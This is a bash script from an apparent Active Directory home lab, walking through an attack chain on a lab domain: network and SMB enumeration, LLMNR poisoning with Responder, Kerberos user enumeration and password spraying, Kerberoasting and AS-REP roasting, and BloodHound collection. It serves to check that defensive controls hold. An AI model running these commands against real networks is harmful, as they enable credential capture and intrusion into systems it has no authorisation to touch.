#!/usr/bin/env bash
# =============================================================================
# Attack chain against corp.local, run from the kali-pen VM.
#
# LAB USE ONLY. Every command here targets a domain I own, on an isolated
# segment I control. Do not run any of this against systems you are not
# authorized to test.
#
# Lab: corp.local (Windows Server 2025 AD lab). Identifiers are placeholders.
# See ../../docs/05-attack-and-defend.md for the write-up and the controls
# that stop each step.
# =============================================================================

set -euo pipefail

DC_IP="10.10.10.10"
DOMAIN="corp.local"
DC_SUBNET="10.10.10.0/24"
IFACE="eth0"
USERLIST="users.txt"

echo "[*] 1. Recon: services, SMB, null-session enumeration"
nmap -sV -p 53,88,135,139,389,445,464,636,3268 "$DC_SUBNET"
enum4linux-ng -A "$DC_IP" || true
nxc smb "$DC_IP"                      # note whether SMB signing is required

echo "[*] 2. LLMNR / NBT-NS poisoning (capture NetNTLMv2)"
echo "    Run until a hash is captured, then Ctrl-C:"
echo "    sudo responder -I $IFACE -wv"

echo "[*] 3. Password spray (expect the lockout policy to trip)"
kerbrute userenum     -d "$DOMAIN" --dc "$DC_IP" "$USERLIST" || true
kerbrute passwordspray -d "$DOMAIN" --dc "$DC_IP" "$USERLIST" 'Spring2026!' || true

echo "[*] 4. Kerberoast / AS-REP roast (expect little or nothing to roast)"
GetUserSPNs.py "${DOMAIN}/jack-user" -dc-ip "$DC_IP" -request || true
GetNPUsers.py  "${DOMAIN}/" -dc-ip "$DC_IP" -usersfile "$USERLIST" -no-pass || true

echo "[*] 5. BloodHound enumeration (expect no path from managed users to DA)"
echo "    bloodhound-python -d $DOMAIN -u jack-user -p '<lab-pw>' -c All -ns $DC_IP"

echo "[*] 6. Credential dump / cached reuse are run on a managed workstation."
echo "    Expect LSA protection (RunAsPPL) and CachedLogonsCount=0 to block them."
echo "[*] Done. Review the blue-team side with blue-team-verification.ps1 on the DC."
